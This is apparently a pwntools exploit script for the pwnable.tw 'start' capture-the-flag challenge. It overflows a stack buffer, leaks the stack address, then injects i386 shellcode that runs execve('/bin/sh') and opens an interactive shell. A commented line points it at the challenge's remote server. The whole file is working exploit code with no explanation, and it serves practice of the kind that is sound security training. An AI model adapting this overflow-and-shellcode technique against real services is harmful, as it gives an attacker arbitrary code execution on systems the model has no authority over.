from pwn import *

io = process("./start")
io = gdb.debug("./start", 
'''
break *0x08048087
continue
''')
# io = remote("chall.pwnable.tw", 10000)
context.log_level = 'debug'
context.arch = 'i386'
payload = b'a' * 20
payload += p32(0x08048087)
io.recvuntil("CTF:")
io.send(payload)
esp = io.recv(4)
esp = int.from_bytes(esp, byteorder = 'little')
print("esp: ", hex(esp))
shellcode = asm('''
mov eax, 0xb
xor ecx, ecx
xor edx, edx
xor esi, esi
push 0x0068732f
push 0x6e69622f
mov ebx, esp
int 0x80
''')
payload = b'a' * 20
payload += p32(esp+20)
# payload += b"BBBBBBBB"
payload += shellcode
io.send(payload)
io.interactive()